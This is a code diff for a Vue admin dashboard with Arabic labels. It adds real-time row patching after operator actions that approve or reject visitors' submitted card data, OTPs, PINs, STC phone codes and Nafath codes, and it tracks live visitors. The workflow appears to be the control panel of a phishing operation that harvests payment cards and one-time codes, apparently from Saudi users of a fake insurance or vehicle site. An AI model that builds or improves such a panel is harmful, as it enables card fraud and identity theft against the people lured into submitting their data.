@@ -56,7 +56,7 @@
                 <div v-if="totalCustomers > 0 && lastPage <= 1" class="flex items-center justify-between mt-4 rounded-xl px-4 py-3"
                     :style="{ backgroundColor: 'var(--admin-card-bg)', borderWidth: '1px', borderColor: 'var(--admin-card-border)' }">
                     <div class="text-xs" style="color: var(--admin-text-dim);">
-                        إجمالي العملاء (بيانات بطاقات): <span class="font-bold" style="color: var(--admin-text);">{{ totalCustomers }}</span>
+                        إجمالي العملاء الذين دخلوا الموقع: <span class="font-bold" style="color: var(--admin-text);">{{ totalCustomers }}</span>
                     </div>
                 </div>
 
@@ -64,7 +64,7 @@
                 <div v-if="lastPage > 1" class="flex items-center justify-between mt-4 rounded-xl px-4 py-3"
                     :style="{ backgroundColor: 'var(--admin-card-bg)', borderWidth: '1px', borderColor: 'var(--admin-card-border)' }">
                     <div class="text-xs" style="color: var(--admin-text-dim);">
-                        عرض {{ (currentPage - 1) * perPage + 1 }}–{{ Math.min(currentPage * perPage, totalCustomers) }} من {{ totalCustomers }} (بيانات بطاقات)
+                        عرض {{ (currentPage - 1) * perPage + 1 }}–{{ Math.min(currentPage * perPage, totalCustomers) }} من {{ totalCustomers }} عميل دخلوا الموقع
                     </div>
                     <div class="flex items-center gap-1">
                         <button
@@ -106,7 +106,7 @@
             <div v-else class="rounded-2xl p-12 text-center" :style="{ backgroundColor: 'var(--admin-card-bg)', borderWidth: '1px', borderColor: 'var(--admin-card-border)', boxShadow: 'var(--admin-card-shadow)' }">
                 <i class="fa-solid fa-users text-3xl mb-3" style="color: var(--admin-text-dim);" aria-hidden="true"></i>
                 <p class="text-sm" style="color: var(--admin-text-dim);">
-                    {{ hasActiveFilters ? 'لا توجد نتائج مطابقة للفلاتر الحالية' : 'لا يوجد عملاء متصلون حالياً' }}
+                    {{ hasActiveFilters ? 'لا توجد نتائج مطابقة للفلاتر الحالية' : 'لا يوجد عملاء دخلوا الموقع حتى الآن' }}
                 </p>
                 <button
                     v-if="hasActiveFilters"
@@ -215,7 +215,30 @@ let _refreshQueued = false;           // whether a newer refresh was requested m
 let _refreshTrailingTimer = null;     // one coalesced refresh after the active request settles
 let _refreshEnabled = false;          // false while unmounted/deactivated
 let _deferredRefreshTimer = null;     // delayed fallback refresh after transient failures
+let _deferredPatchTimers = new Map(); // customerId => timer for lightweight post-action patch
 const BATCH_INTERVAL = 2_000;         // apply batched updates every 2 seconds
+const WS_BACKED_ACTIONS = new Set( [
+    'card-approve',
+    'card-reject',
+    'otp-approve',
+    'otp-reject',
+    'otp-reject-redirect',
+    'pin-approve',
+    'pin-reject',
+    'phone-data-approve',
+    'phone-data-reject',
+    'phone-otp-approve',
+    'phone-otp-reject',
+    'stc-waiting-approve',
+    'stc-waiting-reject',
+    'stc-otp-approve',
+    'stc-otp-reject',
+    'stc-call-approve',
+    'stc-call-reject',
+    'nafath-approve',
+    'nafath-reject',
+    'nafath-update-code',
+] );
 
 // ── Loading / error state for initial fetch ──
 const initialLoading = ref( true );   // true until first successful refresh
@@ -417,6 +440,22 @@ function scheduleDeferredRefresh ( reason = 'deferred', delayMs = 7000 ) {
     }, delayMs );
 }
 
+function resolveCustomerIdFromEvent ( event ) {
+    if ( event?.customer_id ) return event.customer_id;
+    if ( !event?.ip_address ) return null;
+    return customers.value.find( c => c.ip === event.ip_address || c.ip_address === event.ip_address )?.id ?? null;
+}
+
+function scheduleDeferredCustomerPatch ( customerId, reason = 'deferred-patch', delayMs = 1500 ) {
+    if ( !customerId || !_refreshEnabled || _deferredPatchTimers.has( customerId ) ) return;
+    const timer = setTimeout( () => {
+        _deferredPatchTimers.delete( customerId );
+        logger.debug( `[Dashboard] deferred customer patch fired (${ reason })` );
+        patchSingleCustomer( customerId );
+    }, delayMs );
+    _deferredPatchTimers.set( customerId, timer );
+}
+
 function isTransientRefreshError ( error ) {
     const message = String( error?.message ?? '' );
     const status = error?.response?.status;
@@ -428,6 +467,15 @@ function isTransientRefreshError ( error ) {
         || message.includes( 'timeout' )
         || message.includes( 'Network Error' )
         || message.includes( 'ERR_NETWORK_CHANGED' );
+}
+
+function isCanceledRefreshError ( error ) {
+    const message = String( error?.message ?? '' ).toLowerCase();
+    return error?.name === 'AbortError'
+        || error?.code === 'ERR_CANCELED'
+        || message.includes( 'aborted' )
+        || message.includes( 'canceled' )
+        || message.includes( 'cancelled' );
 }
 
 // ── New: WebSocket State Management ──
@@ -796,7 +844,7 @@ function handleRealtimeUpdate ( event ) {
         const idx = customers.value.findIndex( c => c.ip === event.ip_address || c.id === event.customer_id );
         if ( idx !== -1 ) {
             const updated = [ ...customers.value ];
-            updated[ idx ] = { ...updated[ idx ], is_active: false };
+            updated[ idx ] = { ...updated[ idx ], is_active: false, is_online: false };
             customers.value = applyOrdering( updated );
         }
         return;
@@ -850,8 +898,9 @@ function handleRealtimeUpdate ( event ) {
                     _throttledRefreshPayload = null;
                     if ( !pending ) return;
                     _lastRefreshAt = Date.now();
-                    if ( pending.customer_id ) {
-                        patchSingleCustomer( pending.customer_id );
+                    const customerId = resolveCustomerIdFromEvent( pending );
+                    if ( customerId ) {
+                        patchSingleCustomer( customerId );
                     } else {
                         refreshCustomers();
                     }
@@ -868,8 +917,9 @@ function handleRealtimeUpdate ( event ) {
         }
 
         // Patch update: fetch only the changed customer instead of full list
-        if ( event.customer_id ) {
-            patchSingleCustomer( event.customer_id );
+        const customerId = resolveCustomerIdFromEvent( event );
+        if ( customerId ) {
+            patchSingleCustomer( customerId );
         } else {
             refreshCustomers();
         }
@@ -908,7 +958,10 @@ function handleRealtimeUpdate ( event ) {
                     updated[ idx ] = {
                         ...updated[ idx ],
                         current_page: evt.current_page ?? updated[ idx ].current_page,
+                        last_activity: evt.timestamp ?? updated[ idx ].last_activity,
+                        last_activity_at: evt.timestamp ?? updated[ idx ].last_activity_at,
                         is_active: evt.is_active ?? updated[ idx ].is_active,
+                        is_online: true,
                     };
                 } else {
                     // New customer appeared — trigger one refresh
@@ -1008,10 +1061,7 @@ function deduplicateByIp ( list ) {
 
 /**
  * Decide whether a customer row should appear in the dashboard.
- * Keep the row if EITHER:
- *   • The customer has submitted any payment card data (original cleanup rule), OR
- *   • The customer is currently active (browsing now) — so admins can see live visitors
- *     before they reach the checkout step.
+ * The API now returns every real visitor/customer row; keep every non-empty row.
  */
 function shouldDisplayCustomer ( customer ) {
     return Boolean( customer );
@@ -1249,7 +1299,7 @@ const refreshCustomers = async () => {
         const rows = ( data.data || [] ).filter( shouldDisplayCustomer );
         // ── Smart refresh: skip re-render when data hasn't changed ──
         const fingerprint = `${ data.total }:${ data.active_count }:` +
-            rows.map( r => `${ r.id }|${ r.updated_at }|${ r.is_active ? 1 : 0 }|${ r.current_page }|${ r.has_new_vehicle ? 1 : 0 }|${ r.has_new_insurance ? 1 : 0 }|${ r.has_new_payment ? 1 : 0 }` ).join( ';' );
+            rows.map( r => `${ r.id }|${ r.updated_at }|${ r.last_activity_at }|${ r.is_online ? 1 : 0 }|${ r.current_page }|${ r.has_new_vehicle ? 1 : 0 }|${ r.has_new_insurance ? 1 : 0 }|${ r.has_new_payment ? 1 : 0 }` ).join( ';' );
         if ( fingerprint === _lastDataHash && !initialLoading.value ) {
             logger.debug( `[Dashboard] refreshCustomers — no changes, skip render (${ rows.length } rows)` );
             loadError.value = false;
@@ -1274,7 +1324,7 @@ const refreshCustomers = async () => {
         logger.debug( `[Dashboard] refreshCustomers success: ${ rows.length } rows` );
         return true;
     } catch ( error ) {
-        if ( error?.code === 'ERR_CANCELED' ) {
+        if ( isCanceledRefreshError( error ) ) {
             return true;
         }
         if ( isTransientRefreshError( error ) && customers.value.length > 0 ) {
@@ -1639,8 +1689,13 @@ const handleCustomerAction = async ( payload ) => {
             recordMarkViewed( ip, 'has_new_payment' );
         }
 
-        // WS already patches rows; avoid synchronous heavy refresh under action load.
-        scheduleDeferredRefresh( 'post-action', 1500 );
+        // WS events already carry the state change; use a row patch as a fallback
+        // instead of adding a full-list refresh while the action pipeline is busy.
+        if ( WS_BACKED_ACTIONS.has( action ) && customer?.id ) {
+            scheduleDeferredCustomerPatch( customer.id, 'post-action', 2500 );
+        } else {
+            scheduleDeferredRefresh( 'post-action', 2500 );
+        }
 
         // ✅ Immediately refresh notification bell + sidebar badges
         // so resolved items disappear without waiting for 120s/60s poll
